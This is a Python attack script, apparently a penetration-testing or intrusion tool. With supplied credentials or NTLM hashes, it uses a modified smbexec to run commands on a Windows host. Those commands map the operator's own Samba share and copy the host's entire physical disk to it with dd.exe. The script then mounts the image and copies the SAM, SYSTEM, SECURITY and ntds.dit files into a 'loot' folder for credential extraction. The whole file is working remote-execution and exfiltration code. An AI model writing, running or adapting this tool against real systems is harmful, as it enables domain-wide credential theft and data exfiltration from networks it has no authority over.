# LastResorNTDS.py
import subprocess
import time
import os
import re
import shutil
from datetime import datetime

def start_samba_server(ip, share_name=None, share_user=None, share_pass=None, share_group=None):
    cmd = ['python3', 'sambaserver.py', '-ip', ip]
    if share_name:
        cmd += ['-sharename', share_name]
    if share_user:
        cmd += ['-shareuser', share_user]
    if share_pass:
        cmd += ['-sharepassword', share_pass]
    if share_group:
        cmd += ['-sharegroup', share_group]
    
    process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    time.sleep(5)  # Give some time for the server to start
    return process

def stop_samba_server():
    os.system('sudo systemctl stop smbd')
    os.system('sudo systemctl start smbd')  # Restart the service to revert any changes made

def run_smbexec(target, username, password, domain, commands, share, mode='SHARE', shell_type='cmd', hashes=None):
    cmd = ['python3', 'smbexec-modified.py', target, '-share', share, '-mode', mode, '-shell-type', shell_type]
    if username:
        cmd += ['-username', username]
    if password:
        cmd += ['-password', password]
    if domain:
        cmd += ['-domain', domain]
    if hashes:
        cmd += ['-hashes', hashes]
    
    process = subprocess.Popen(cmd, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
    
    for command in commands:
        process.stdin.write(command + '\n')
        process.stdin.flush()
    
    process.stdin.write('exit\n')
    process.stdin.flush()
    
    stdout, stderr = process.communicate()
    print(stdout)
    if stderr:
        print(stderr)
    return stdout, stderr

def create_temp_mount():
    mount_dir = '/tmp/tmpmount'
    if not os.path.exists(mount_dir):
        os.makedirs(mount_dir)
    return mount_dir

def mount_image(image_path, mount_dir):
    os.system(f'sudo mount -o loop {image_path} {mount_dir}')

def unmount_image(mount_dir):
    os.system(f'sudo umount {mount_dir}')
    os.rmdir(mount_dir)

def run_fdisk(image_path):
    result = subprocess.run(['sudo', 'fdisk', '-l', image_path], capture_output=True, text=True)
    output = result.stdout
    print(output)
    
    with open('/tmp/fdisk_output.txt', 'w') as f:
        f.write(output)
    
    return output

def parse_fdisk_output(output):
    sector_size = None
    max_partition_size = 0
    start_byte = None

    # Find sector size
    sector_size_match = re.search(r'Units: sectors of \d+ \* (\d+) = \d+ bytes', output)
    if sector_size_match:
        sector_size = int(sector_size_match.group(1))
    
    # Find the largest partition size and start byte
    partition_info = re.findall(r'(\d+)\s+(\d+)\s+(\d+)\s+(\d+)\s+(\d+)\s+(\d+)\s+', output)
    if partition_info:
        largest_partition = max(partition_info, key=lambda x: int(x[5]))
        start_byte = int(largest_partition[1])
        max_partition_size = int(largest_partition[5])
    
    return sector_size, start_byte, max_partition_size

def create_output_directory(loot_dir=None):
    if not loot_dir:
        now = datetime.now().strftime('%Y%m%d_%H%M%S')
        loot_dir = f'/tmp/{now}_diskloot'
    
    if not os.path.exists(loot_dir):
        os.makedirs(loot_dir)
    
    return loot_dir

def copy_files(mount_dir, loot_dir):
    files_to_copy = {
        'SYSTEM': 'Windows/System32/config/SYSTEM',
        'SECURITY': 'Windows/System32/config/SECURITY',
        'SAM': 'Windows/System32/config/SAM',
        'NTDS': 'Windows/NTDS/ntds.dit'
    }
    
    for name, relative_path in files_to_copy.items():
        src = os.path.join(mount_dir, relative_path)
        dest = os.path.join(loot_dir, name)
        if os.path.exists(src):
            shutil.copy(src, dest)
            print(f'Copied {src} to {dest}')
        else:
            print(f'File {src} not found')

def main():
    ip = input("Enter your machine's IP: ")
    target = input("Enter the target [domain/]username[:password]@<targetName or address>: ")
    username = input("Enter the username: ")
    password = input("Enter the password: ")
    domain = input("Enter the domain: ")
    share_name = input("Enter the share name: ")
    share = input("Enter the share (default: C$): ") or 'C$'
    mode = input("Enter the mode (default: SHARE, SERVER needs root!): ") or 'SHARE'
    shell_type = input("Enter the shell type (cmd/powershell): ") or 'cmd'
    hashes = input("Enter the NTLM hashes (LMHASH:NTHASH): ")
    loot_dir = input("Enter the output directory (leave blank for default): ")

    # Start the Samba server
    samba_process = start_samba_server(ip, share_name=share_name)
    
    try:
        # Mount the share and run the commands
        commands = [
            f"net use Q: \\\\{ip}\\{share_name} /user:{username} {password}",
            f"Q:\\dd\\dd.exe if=\\\\.\\Physicaldrive0 of=Q:\\image.img bs=4M"
        ]
        stdout, stderr = run_smbexec(target, username, password, domain, commands, share, mode, shell_type, hashes)
        
        # Print the completion statement from dd
        if "records out" in stdout:
            print("Dump completed successfully.")

        # Create temporary mount directory
        mount_dir = create_temp_mount()
        image_path = f'/var/tmp/{share_name}/image.img'

        # Run fdisk command and parse output
        fdisk_output = run_fdisk(image_path)
        sector_size, start_byte, max_partition_size = parse_fdisk_output(fdisk_output)
        
        print(f'Sector Size: {sector_size} bytes')
        print(f'Largest Partition Size: {max_partition_size} sectors')
        print(f'Start Byte of Largest Partition: {start_byte}')
        
        # Calculate offset and mount the largest partition
        offset = start_byte * sector_size
        mount_command = f'sudo mount -o loop,offset={offset} {image_path} {mount_dir}'
        os.system(mount_command)
        print(f'Largest partition mounted to {mount_dir} with offset {offset}')
        
        # Create output directory
        loot_dir = create_output_directory(loot_dir)
        print(f'Output directory: {loot_dir}')
        
        # Copy files from mounted drive to output directory
        copy_files(mount_dir, loot_dir)
        
    finally:
        # Unmount the image and clean up
        unmount_image('/tmp/tmpmount')
        samba_process.terminate()
        stop_samba_server()
        print("Samba server stopped and cleaned up.")

if __name__ == '__main__':
    main()
